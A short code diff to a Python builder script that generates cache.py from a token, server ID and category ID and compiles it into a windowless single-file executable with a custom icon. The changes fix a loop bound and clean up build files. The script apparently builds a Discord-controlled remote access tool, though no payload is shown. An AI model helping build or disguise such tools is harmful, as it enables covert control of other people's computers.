@@ -1,6 +1,7 @@
 import subprocess
 import sys
 import os
+import shutil
 
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
@@ -26,7 +27,7 @@ def create_cache(TOKEN, SERVER_ID, CATEGORY_ID):
     data[28-1] = "    " + data[28-1]
 
     # lines that need to indent three times:
-    for i in range(72, len(data)):
+    for i in range(72, len(data)+1):
         line = data[i-1]
         if line != "\n":
             data[i-1] = "            " + line
@@ -59,6 +60,8 @@ def build(TOKEN, SERVER_ID, CATEGORY_ID, ICON):
     build_command = f"pyinstaller --clean --onefile --noconsole --icon={ICON} cache.py --add-data=seedir\\*:seedir"
     subprocess.check_call(build_command, shell=True)
     os.remove("cache.py")
+    os.remove("cache.spec")
+    shutil.rmtree("./build")
 
 
 def interrogate_i_mean_ask(message):
